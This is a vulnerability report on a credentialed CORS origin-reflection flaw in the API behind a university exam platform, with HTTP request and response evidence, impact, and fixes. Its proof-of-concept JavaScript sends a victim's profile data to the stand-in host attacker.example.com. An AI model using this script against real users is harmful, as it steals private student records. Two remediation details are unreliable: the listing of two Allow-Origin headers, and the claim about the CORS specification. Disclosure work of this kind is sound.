# CORS Wildcard Subdomain Reflection with Credentials — api.gurudevelopments.com

**Target:** guru.dcu.ie (backend: api.gurudevelopments.com)  
**Severity:** High  
**Type:** CORS Misconfiguration  
**Status:** Confirmed  

---

## Summary

The API backend for `guru.dcu.ie` (`api.gurudevelopments.com`) reflects any `*.gurudevelopments.com` origin in `Access-Control-Allow-Origin` and additionally sets `Access-Control-Allow-Credentials: true`. An attacker who controls any subdomain of `gurudevelopments.com` (including through a subdomain takeover or XSS on any other tenant's frontend) can make cross-origin authenticated requests to the Guru API on behalf of any logged-in DCU student or staff member.

---

## Proof of Concept

### Request

```http
GET /users/v1/health HTTP/2
Host: api.gurudevelopments.com
Origin: https://pwned.gurudevelopments.com
```

### Response

```http
HTTP/2 401
access-control-allow-origin: https://pwned.gurudevelopments.com
access-control-allow-credentials: true
vary: Origin
vary: Access-Control-Request-Method
vary: Access-Control-Request-Headers
```

The server reflects the arbitrary subdomain origin verbatim and allows credentials, rather than maintaining a strict allowlist.

### Exploitation

An attacker hosting a page at any `*.gurudevelopments.com` subdomain (e.g. via subdomain takeover of a unused DNS entry) can run the following JavaScript to steal authenticated session data from a logged-in DCU Guru user:

```javascript
fetch('https://api.gurudevelopments.com/users/v1/profile', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  // Send victim's profile/session data to attacker
  fetch('https://attacker.example.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
```

If victim visits the attacker's page while authenticated to `guru.dcu.ie`, their Guru session cookies are sent to `api.gurudevelopments.com` and the response (student records, grades, schedule, etc.) is returned to the attacker's page.

---

## Impact

- **Confidentiality:** Cross-origin reads of any authenticated API response — student profile, grades, course enrolments, submitted documents.
- **Integrity:** Cross-origin state-changing requests (POST/PUT/DELETE) if not further CSRF-protected.
- **Scope amplification:** Any other institution using the same Guru platform (AIT, ATU Galway Mayo, ATU Donegal, Sligo IT) shares the same `api.gurudevelopments.com` backend — the misconfiguration affects all tenants.

---

## Root Cause

The server uses a dynamic CORS origin check that matches any subdomain of `gurudevelopments.com` (regex similar to `.*\.gurudevelopments\.com`) instead of an explicit allowlist (`dcu.guruexam.com`, `guru.dcu.ie`). Combined with `Allow-Credentials: true`, this violates the CORS specification (browsers do allow this combination, but it is a security antipattern).

---

## Remediation

1. Replace the dynamic subdomain match with an explicit allowlist of known frontend origins:
   ```
   Access-Control-Allow-Origin: https://dcu.guruexam.com
   Access-Control-Allow-Origin: https://guru.dcu.ie
   ```
2. If a wildcard subdomain match is required, remove `Access-Control-Allow-Credentials: true` — credentials cannot be sent to a wildcard origin anyway.
3. Audit all other tenants' frontend domains and add them to the allowlist individually.

---

## Technical Details

- **Affected endpoint:** `https://api.gurudevelopments.com/users/v1/*`
- **CORS policy:** Dynamic subdomain reflection (`*.gurudevelopments.com`)
- **Credentials allowed:** Yes (`Access-Control-Allow-Credentials: true`)
- **Authentication:** JWT/session-based (Keycloak tokens stored in cookies)
- **Tested on:** 2026-05-03
